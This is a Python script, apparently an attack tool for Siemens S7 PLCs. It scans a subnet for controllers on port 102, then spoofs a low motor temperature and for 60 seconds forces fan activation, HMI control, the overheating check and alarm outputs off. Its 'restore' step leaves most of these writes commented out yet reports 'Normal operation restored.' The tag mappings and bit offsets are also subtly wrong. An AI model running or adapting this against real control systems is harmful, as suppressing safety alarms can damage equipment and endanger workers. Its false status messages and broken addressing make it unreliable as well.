import snap7
import time
import subprocess
import re

# Configuration
PLC_RACK = 0
PLC_SLOT = 1
ALARM_SUPPRESSION_DURATION = 60  # Time in seconds to suppress alarms.  Adjust as needed.

# Tag Addresses (from the provided table)
MOTOR_TEMP_ADDRESS = (snap7.util.S7AreaPE, 7, 0, snap7.util.S7WLWord) # MW7
ACTIVATE_FAN_A_ADDRESS = (snap7.util.S7AreaPA, 0, 0, snap7.util.S7WLBit) # M0.0
ACTIVATE_FAN_B_ADDRESS = (snap7.util.S7AreaPA, 0, 1, snap7.util.S7WLBit) # M0.1
MASTER_FAN_B_HMI_ADDRESS = (snap7.util.S7AreaPA, 0, 5, snap7.util.S7WLBit) # M0.5
OVERHEATING_CHECK_ADDRESS = (snap7.util.S7AreaPA, 0, 2, snap7.util.S7WLBit) # M0.2
FAN_A_RED_ADDRESS = (snap7.util.S7AreaPQ, 0, 4, snap7.util.S7WLBit)   # %Q0.4  Fan_A_Red
FAN_B_RED_ADDRESS = (snap7.util.S7AreaPQ, 0, 2, snap7.util.S7WLBit)   # %Q0.2  Fan_B_Red
FAN_A_ADDRESS = (snap7.util.S7AreaPQ, 0, 0, snap7.util.S7WLBit)   # %Q0.0 Fan_A
FAN_B_ADDRESS = (snap7.util.S7AreaPQ, 0, 1, snap7.util.S7WLBit)   # %Q0.1 Fan_B

def find_plc_ip():
    """
    Attempts to find the PLC's IP address using nmap.  Requires nmap to be installed and in the system's PATH.
    """
    try:
        # Replace '192.168.1.0/24' with your network's subnet
        result = subprocess.run(['nmap', '-p', '102', '192.168.1.0/24'], capture_output=True, text=True, check=True)
        output = result.stdout
        ip_addresses = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        for ip in ip_addresses:
            try:
                #Try connect to each found IP to ensure it is the PLC.
                plc_test = snap7.client.Client()
                plc_test.connect(ip, PLC_RACK, PLC_SLOT)
                plc_test.disconnect()
                print(f"PLC IP address found: {ip}")
                return ip
            except Exception as e:
                print(f"Connection to {ip} failed: {e}")
                continue
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None
    except FileNotFoundError:
        print("nmap not found. Please install nmap and ensure it's in your system's PATH.")
        return None
    return None

def read_tag(plc, address):
    """Reads a tag from the PLC."""
    area, db_number, start, data_type = address
    try:
        if data_type == snap7.util.S7WLBit:
            result = plc.read_area(area, db_number, start, 1)
            return snap7.util.get_bool(result, 0, 0)
        elif data_type == snap7.util.S7WLWord:
            result = plc.read_area(area, db_number, start, 2)
            return snap7.util.get_int(result,0)
        else:
            print(f"Unsupported data type: {data_type}")
            return None
    except Exception as e:
        print(f"Error reading tag at {address}: {e}")
        return None

def write_tag(plc, address, value):
    """Writes a tag to the PLC."""
    area, db_number, start, data_type = address
    try:
        data = bytearray(2)  # Default size for Word/Int.  Adjust if needed.
        if data_type == snap7.util.S7WLBit:
             snap7.util.set_bool(data, 0, 0, value)
             plc.write_area(area, db_number, start, 1, data)
        elif data_type == snap7.util.S7WLWord:
            snap7.util.set_int(data, 0, value)
            plc.write_area(area, db_number, start, 2, data)
        else:
            print(f"Unsupported data type: {data_type}")
            return
        print(f"Successfully wrote {value} to {address}")

    except Exception as e:
        print(f"Error writing to tag at {address}: {e}")


def inhibit_alarm_response(plc, motor_temp):
    """
    Simulates alarm suppression by:
    1. Setting Motor_Temp to a value below the alarm threshold (e.g., 250)
    2. Forcing Activate_Fan_B to FALSE, preventing it from activating even if Motor_Temp were high.
    3. Forcing Master_Fan_B_HMI to FALSE, preventing HMI acknowledgement or control.
    4. Forcing Overheating_Check to FALSE
    5. Forcing Alarm Outputs to FALSE, Fan_A_Red and Fan_B_Red
    """
    try:
        # 1. Set Motor_Temp below alarm threshold
        print("Lowering Motor_Temp to suppress alarms...")
        write_tag(plc, MOTOR_TEMP_ADDRESS, motor_temp)  #Set to safe value.

        # 2. Force Activate_Fan_B to FALSE
        print("Disabling Fan B activation...")
        write_tag(plc, ACTIVATE_FAN_B_ADDRESS, False)

        # 3. Force Master_Fan_B_HMI to FALSE
        print("Disabling Master Fan B HMI control...")
        write_tag(plc, MASTER_FAN_B_HMI_ADDRESS, False)

        # 4. Force Overheating Check to False
        print("Forcing Overheating Check to False")
        write_tag(plc, OVERHEATING_CHECK_ADDRESS, False)

        #5. Forcing Alarm Outputs to FALSE
        print("Forcing Alarm Outputs to False...")
        write_tag(plc, FAN_A_RED_ADDRESS, False)
        write_tag(plc, FAN_B_RED_ADDRESS, False)

        print("Alarm suppression initiated.")

    except Exception as e:
        print(f"Error during alarm suppression: {e}")


def restore_normal_operation(plc, original_motor_temp):
    """
    Restores the PLC to its original state after alarm suppression.
    """
    try:
        # Restore Motor_Temp to its original value
        print("Restoring Motor_Temp...")
        write_tag(plc, MOTOR_TEMP_ADDRESS, original_motor_temp)

        # Restore Activate_Fan_B (remove force) - This assumes you know the previous state or let the PLC logic control it.
        print("Removing force from Activate_Fan_B - PLC logic will now control.")
        # In Snap7, there isn't a direct "remove force" command. You either write a value, or the PLC logic takes over.
        # The following line sets it to false, but the PLC code will then control it based on temperature.
        # If you need to restore it to its *previous* state, you'd need to have read and saved that state *before* the inhibit_alarm_response function.
        #write_tag(plc, ACTIVATE_FAN_B_ADDRESS, False) #Or, if the initial state was TRUE, write TRUE

        # Restore Master_Fan_B_HMI (remove force)
        print("Removing force from Master_Fan_B_HMI - PLC logic will now control.")
        #Same logic as above applies here.
        #write_tag(plc, MASTER_FAN_B_HMI_ADDRESS, False)

        #Restore Overheating_Check
        print("Removing force from Overheating Check - PLC logic will now control.")
        #write_tag(plc, OVERHEATING_CHECK_ADDRESS, False)

        #Restore Alarm Outputs
        print("Removing force from Alarm Outputs - PLC logic will now control.")
        #write_tag(plc, FAN_A_RED_ADDRESS, False)
        #write_tag(plc, FAN_B_RED_ADDRESS, False)

        print("Normal operation restored.")

    except Exception as e:
        print(f"Error during operation restoration: {e}")

def main():
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Could not find PLC IP address. Exiting.")
        return

    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {plc_ip}")

        # 1. Read initial Motor_Temp value
        original_motor_temp = read_tag(plc, MOTOR_TEMP_ADDRESS)
        if original_motor_temp is None:
            print("Failed to read initial Motor_Temp. Exiting.")
            return

        print(f"Initial Motor_Temp: {original_motor_temp}")

        # 2. Inhibit alarm response
        inhibit_alarm_response(plc, 250) #Set to a safe value.

        # 3. Wait for a specified duration
        print(f"Alarm suppression active for {ALARM_SUPPRESSION_DURATION} seconds...")
        time.sleep(ALARM_SUPPRESSION_DURATION)

        # 4. Restore normal operation
        restore_normal_operation(plc, original_motor_temp)


    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()